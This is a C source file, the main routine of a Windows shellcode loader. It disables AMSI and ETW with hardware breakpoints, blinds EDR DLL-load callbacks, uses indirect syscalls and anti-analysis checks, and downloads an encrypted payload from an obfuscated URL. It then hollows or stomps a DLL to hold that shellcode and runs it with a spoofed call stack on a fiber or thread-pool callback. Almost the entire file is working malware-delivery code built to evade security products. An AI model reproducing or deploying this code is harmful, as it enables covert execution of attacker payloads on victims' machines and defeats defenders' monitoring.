// =============================================
// main.c - Shellcode Loader
//
// Evasion:  Patchless AMSI/ETW (VEH + HW breakpoints)
// Memory:   Phantom DLL Hollowing -> Module Stomp -> NtAllocateVirtualMemory
// Thread:   Thread pool callback (TpAllocWork/TpPostWork)
// Stack:    Call gadget injection + tail-call spoofing
// Syscalls: Indirect with randomized gadget pool
// Crypto:   Chaskey-CTR (replaces RC4/SystemFunction032)
// Compress: LZNT1 via ntdll (optional, per-build)
// =============================================

#include "Common.h"

// Instantiate encoded data (auto-generated in Payload.h)
static unsigned char EncodedUrl[]    = INIT_ENCODED_URL;
static unsigned char ProtectedKey[]  = INIT_PROTECTED_KEY;
static unsigned char ChaskeyNonce[]  = INIT_CHASKEY_NONCE;

// -----------------------------------------------
// Decode XOR-encoded URL string at runtime
// -----------------------------------------------
static VOID DecodeUrl(OUT PCHAR pOut, IN PBYTE pEncoded, IN DWORD dwLen, IN BYTE bKey) {
    for (DWORD i = 0; i < dwLen; i++)
        pOut[i] = (CHAR)(pEncoded[i] ^ bKey);
}

// -----------------------------------------------
// Entry Point
// -----------------------------------------------
int Main(VOID) {

    NTAPI_FUNC  NtApis  = { 0 };
    API_HASHING WinApis = { 0 };
    NTSTATUS    STATUS  = 0x00;

    // --- IAT Camouflage ---
    IatCamouflage();

    // --- Anti-Analysis (skipped in DEBUG builds) ---
#ifndef DEBUG
    if (!AntiAnalysis())
        return 0;
#endif

    // --- Initialize indirect syscall engine ---
    // Builds gadget pool (all syscall;ret in ntdll) + resolves 5 NT syscalls
    if (!InitializeNtSyscalls(&NtApis))
        return 0;

    // --- Initialize WinAPI function pointers (PEB hash walking) ---
    if (!InitializeWinApis(&WinApis))
        return 0;

    // --- Blind EDR DLL load monitoring ---
    // Removes all LdrRegisterDllNotification callbacks so EDR
    // can't see subsequent LoadLibrary calls (amsi, wininet, ktmw32)
    BlindDllNotifications(&WinApis);

    // --- Shuffled DLL preload ---
    // Load the three flow-critical DLLs in per-run randomized order so
    // kernel ETW image-load sequence can't be learned by ML baselining.
    // Subsequent LoadLibraryA calls in Evasion/Staging/Stomper hit the
    // loader cache and emit no further image-load events.
    BYTE xAmsi[]    = XSTR_AMSI_DLL;    DEOBF(xAmsi);
    BYTE xWininet[] = XSTR_WININET_DLL; DEOBF(xWininet);
    BYTE xKtm[]     = XSTR_KTMW32_DLL;  DEOBF(xKtm);
    LPCSTR preload[] = { (LPCSTR)xAmsi, (LPCSTR)xWininet, (LPCSTR)xKtm };
    ShufflePreloadLibraries(&WinApis, preload, 3);

    // --- Patchless AMSI/ETW bypass ---
    // VEH + hardware breakpoints on EtwEventWrite/AmsiScanBuffer
    // NtContinue sets DR0/DR1 without ETW-TI telemetry
    PatchlessAmsiEtw(&WinApis);

    // --- Key recovery ---
    PBYTE pRealKey = NULL;
    if (!BruteForceDecryption(HINT_BYTE, ProtectedKey, KEY_SIZE, &pRealKey))
        return 0;

    // --- Download encrypted payload ---
    PBYTE pPayload      = NULL;
    DWORD dwPayloadSize = 0;

    CHAR szUrl[512] = { 0 };
    DecodeUrl(szUrl, EncodedUrl, URL_LENGTH, URL_XOR_KEY);
    LOG("[*] Downloading payload...");
    if (!DownloadPayload(&WinApis, szUrl, &pPayload, &dwPayloadSize)) {
        MemSet(pRealKey, 0, KEY_SIZE);
        HeapFree(GetProcessHeap(), 0, pRealKey);
        return 0;
    }
    MemSet(szUrl, 0, sizeof(szUrl));
    MemSet(EncodedUrl, 0, sizeof(EncodedUrl));
    LOG("[+] Payload loaded");

    // --- Decrypt with Chaskey-CTR ---
    if (!ChaskeyCtrDecrypt(pPayload, dwPayloadSize, pRealKey, ChaskeyNonce)) {
        HeapFree(GetProcessHeap(), 0, pPayload);
        MemSet(pRealKey, 0, KEY_SIZE);
        HeapFree(GetProcessHeap(), 0, pRealKey);
        return 0;
    }
    LOG("[+] Payload decrypted");

    // Wipe key material immediately
    MemSet(pRealKey, 0, KEY_SIZE);
    HeapFree(GetProcessHeap(), 0, pRealKey);
    pRealKey = NULL;
    MemSet(ProtectedKey, 0, sizeof(ProtectedKey));
    MemSet(ChaskeyNonce, 0, sizeof(ChaskeyNonce));

    // --- Decompress (if payload was LZNT1-compressed) ---
    PBYTE pShellcode      = pPayload;
    DWORD dwShellcodeSize = dwPayloadSize;

#if USE_COMPRESSION
    PBYTE pDecompressed = NULL;
    if (!DecompressPayload(&WinApis, pPayload, dwPayloadSize, &pDecompressed, PAYLOAD_SIZE)) {
        LOG("[!] Decompression failed");
        HeapFree(GetProcessHeap(), 0, pPayload);
        return 0;
    }
    LOG("[+] Payload decompressed");

    // Free compressed buffer, use decompressed
    MemSet(pPayload, 0, dwPayloadSize);
    HeapFree(GetProcessHeap(), 0, pPayload);
    pShellcode      = pDecompressed;
    dwShellcodeSize = PAYLOAD_SIZE;
#endif

    // ============================================================
    // Stage 1: Shellcode Placement (3-tier fallback)
    //
    // 1. Phantom DLL Hollowing (NTFS Transactions)
    //    - Section backed by rolled-back transacted file
    //    - EDR can't verify memory against disk (FILE_OBJECT mismatch)
    //    - Requires write access to System32 DLL (elevated)
    //
    // 2. Module Stomping
    //    - LoadLibrary + overwrite .text section
    //    - Memory attributed to signed DLL
    //    - Detectable by EDR integrity checks (disk vs memory)
    //
    // 3. NtAllocateVirtualMemory (last resort)
    //    - Private memory (most suspicious)
    //    - Always works regardless of shellcode size
    //
    // Memory protection is controlled by SHELLCODE_EXEC_PROT:
    //   RWX_SHELLCODE defined:   PAGE_EXECUTE_READWRITE (Go/Sliver)
    //   RWX_SHELLCODE undefined: PAGE_EXECUTE_READ (W^X)
    // ============================================================

    PVOID pExec   = NULL;
    BOOL  bPlaced = FALSE;

    // Try phantom DLL hollowing first
    bPlaced = PhantomDllHollow(&WinApis, &NtApis, pShellcode, dwShellcodeSize, &pExec);
    if (bPlaced) {
        LOG("[+] Shellcode placed via phantom DLL hollowing");
    }

    // Fall back to module stomping
    if (!bPlaced) {
        bPlaced = ModuleStomp(&WinApis, pShellcode, dwShellcodeSize, &pExec);
        if (bPlaced) {
            LOG("[+] Shellcode placed via module stomping");
        }
    }

    // Last resort: direct allocation (RW -> copy -> RX/RWX)
    if (!bPlaced) {
        LOG("[*] Fallback to NtAllocateVirtualMemory");

        SIZE_T sRegion = (SIZE_T)dwShellcodeSize;
        SET_SYSCALL(NtApis.NtAllocateVirtualMemory);
        STATUS = RunSyscall(
            (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)&pExec,
            (ULONG_PTR)0, (ULONG_PTR)&sRegion,
            (ULONG_PTR)(MEM_COMMIT | MEM_RESERVE), (ULONG_PTR)PAGE_READWRITE,
            0, 0, 0, 0, 0, 0
        );
        if (!NT_SUCCESS(STATUS)) {
            HeapFree(GetProcessHeap(), 0, pShellcode);
            return 0;
        }

        MemCopy(pExec, pShellcode, dwShellcodeSize);

        // Change from RW to executable (RX or RWX)
        ULONG   dwOldProt  = 0;
        SIZE_T  sProtSize  = (SIZE_T)dwShellcodeSize;
        PVOID   pProtAddr  = pExec;

        SET_SYSCALL(NtApis.NtProtectVirtualMemory);
        STATUS = RunSyscall(
            (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)&pProtAddr,
            (ULONG_PTR)&sProtSize, (ULONG_PTR)SHELLCODE_EXEC_PROT,
            (ULONG_PTR)&dwOldProt,
            0, 0, 0, 0, 0, 0, 0
        );
        if (!NT_SUCCESS(STATUS)) {
            HeapFree(GetProcessHeap(), 0, pShellcode);
            return 0;
        }
    }

    // Wipe original payload from heap
    MemSet(pShellcode, 0, dwShellcodeSize);
    HeapFree(GetProcessHeap(), 0, pShellcode);

    // ============================================================
    // Cleanup: Remove evasion artifacts before shellcode runs
    //
    // - Remove VEH handler (no longer needed)
    // - Clear debug register target addresses
    // - Wipe decoded strings from stack/globals
    // ============================================================

    CleanupEvasion(&WinApis);
    LOG("[+] Evasion cleanup complete");

    // ============================================================
    // Stage 2: Call Stack Spoofing + Callback Execution
    //
    // Find a 'call rbx' (FF D3) gadget in ntdll to inject a
    // legitimate stack frame. Combined with module stomping or
    // phantom hollowing, the full call stack looks clean:
    //
    //   shellcode RIP  (in stomped/phantom DLL .text)
    //   -> gadget site  (in ntdll — 'call rbx' return addr)
    //   -> TppWorkpExecute     (ntdll)
    //   -> TppWorkerThread     (ntdll)
    //   -> RtlUserThreadStart  (ntdll)
    // ============================================================

    // Harvest `call rbx` gadgets across ntdll / kernel32 / kernelbase,
    // then pick one per-run via RDTSC. Using a pool instead of a fixed
    // single ntdll gadget defeats EDR rules that flag high-frequency
    // identical return addresses in the injected stack frame.
    CollectCallGadgets();
    PVOID pCallGadget = GetRandomCallGadget();

    // Store target + gadget for the ASM callback wrapper
    SetSpoofTarget(pExec, pCallGadget);

    // #9 Draugr MVP: build a 1 MB synthetic stack whose top contains
    // three fake return addresses pointing into RtlUserThreadStart /
    // BaseThreadInitThunk / NtWaitForSingleObject. SpoofCallback will
    // swap RSP to this buffer before jumping to shellcode, so kernel
    // call-stack walkers see a plausible fresh-thread chain.
    SetSpoofStack(BuildSyntheticStack(&WinApis));

    // pNtdll needed below for thread-pool fallback path
    BYTE xNtdll[] = XSTR_NTDLL_DLL;
    DEOBF(xNtdll);
    PVOID pNtdll = (PVOID)WinApis.pGetModuleHandleA((LPCSTR)xNtdll);

    // ============================================================
    // #12 Poison Fiber kick-off
    //
    // Converts the main thread to a fiber and switches to a new
    // fiber whose entry is SpoofCallback. No new OS thread is
    // created → no PsSetCreateThreadNotifyRoutine callback fires,
    // blinding all kernel-thread-callback-based EDRs.
    //
    // SwitchToFiber never returns to main (shellcode runs forever on
    // the fiber stack). If any fiber API fails we fall back to the
    // original thread-pool path, which is still call-stack spoofed.
    // ============================================================
    PVOID pKernel32 = FindLoadedModuleW(L"KERNEL32.DLL");

    BYTE xConv[]   = XSTR_CONVERT_THREAD_TO_FIBER; DEOBF(xConv);
    BYTE xCreate[] = XSTR_CREATE_FIBER;            DEOBF(xCreate);
    BYTE xSwitch[] = XSTR_SWITCH_TO_FIBER;         DEOBF(xSwitch);

    typedef LPVOID (WINAPI *fnConvertThreadToFiber)(LPVOID);
    typedef LPVOID (WINAPI *fnCreateFiber)(SIZE_T, LPFIBER_START_ROUTINE, LPVOID);
    typedef VOID   (WINAPI *fnSwitchToFiber)(LPVOID);

    fnConvertThreadToFiber pConvert = pKernel32
        ? (fnConvertThreadToFiber)WinApis.pGetProcAddress((HMODULE)pKernel32, (LPCSTR)xConv)
        : NULL;
    fnCreateFiber pCreate = pKernel32
        ? (fnCreateFiber)WinApis.pGetProcAddress((HMODULE)pKernel32, (LPCSTR)xCreate)
        : NULL;
    fnSwitchToFiber pSwitch = pKernel32
        ? (fnSwitchToFiber)WinApis.pGetProcAddress((HMODULE)pKernel32, (LPCSTR)xSwitch)
        : NULL;

    if (pConvert && pCreate && pSwitch) {
        LPVOID pMainFiber = pConvert(NULL);
        if (pMainFiber) {
            // SpoofCallback's NTAPI ABI matches LPFIBER_START_ROUTINE
            // on x64 (single LPVOID in RCX, no shadow-space consumption).
            LPVOID pShellcodeFiber = pCreate(0, (LPFIBER_START_ROUTINE)SpoofCallback, NULL);
            if (pShellcodeFiber) {
                LOG("[*] Switching to shellcode fiber...");
                pSwitch(pShellcodeFiber);     // never returns
                return 0;
            }
        }
        LOG("[!] Fiber path failed, falling back to thread pool");
    }

    // Thread-pool workers have their own legit TppWorkerThread ->
    // RtlUserThreadStart chain on their native stack, which is more
    // convincing than our synthetic buffer. Disable the RSP swap so
    // the fallback path keeps that natural chain.
    SetSpoofStack(NULL);

    // ----- Thread-pool fallback path (original behaviour) -----
    fnTpAllocWork  pTpAllocWork  = (fnTpAllocWork)FetchExportAddress(pNtdll, TpAllocWork_JOAAT);
    fnTpPostWork   pTpPostWork   = (fnTpPostWork)FetchExportAddress(pNtdll, TpPostWork_JOAAT);

    if (!pTpAllocWork || !pTpPostWork)
        return 0;

    PVOID pWork = NULL;
    STATUS = pTpAllocWork(&pWork, (PVOID)SpoofCallback, NULL, NULL);
    if (!NT_SUCCESS(STATUS) || !pWork)
        return 0;

    LOG("[*] Executing via thread pool callback (spoofed stack)...");
    pTpPostWork(pWork);

    // Keep process alive via alertable wait on NtCurrentProcess pseudo-handle.
    // Alertable=TRUE → thread WaitReason = UserRequest (not DelayExecution),
    // avoiding Hunt-Sleeping-Beacons / BeaconHunter thread-state fingerprints.
    while (TRUE) {
        SET_SYSCALL(NtApis.NtWaitForSingleObject);
        RunSyscall(
            (ULONG_PTR)(HANDLE)-1,  // NtCurrentProcess()
            (ULONG_PTR)TRUE,        // Alertable
            (ULONG_PTR)NULL,        // Infinite timeout
            0, 0, 0, 0, 0, 0, 0, 0, 0
        );
    }

    return 0;
}
